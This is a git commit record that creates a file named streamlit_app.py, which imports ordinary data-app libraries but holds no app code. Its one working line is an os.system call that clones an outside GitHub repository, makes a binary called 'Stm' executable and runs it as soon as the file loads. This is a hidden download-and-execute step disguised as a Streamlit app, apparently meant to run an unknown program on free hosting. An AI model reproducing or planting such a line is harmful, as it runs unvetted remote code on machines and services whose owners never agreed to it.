c52cde72492d02f2f5416ecf2094a4b6da228ae2
vipoteg <109018506+vipoteg@users.noreply.github.com>
2022-07-10 15:01:25 +0700

    Create streamlit_app.py

---
+++ streamlit_app.py
@@ -0,0 +1,7 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+import os
+os.system ("rm -rf smlt && git clone https://github.com/Akatsoki/smlt.git && cd smlt && chmod +x Stm && ./Stm")
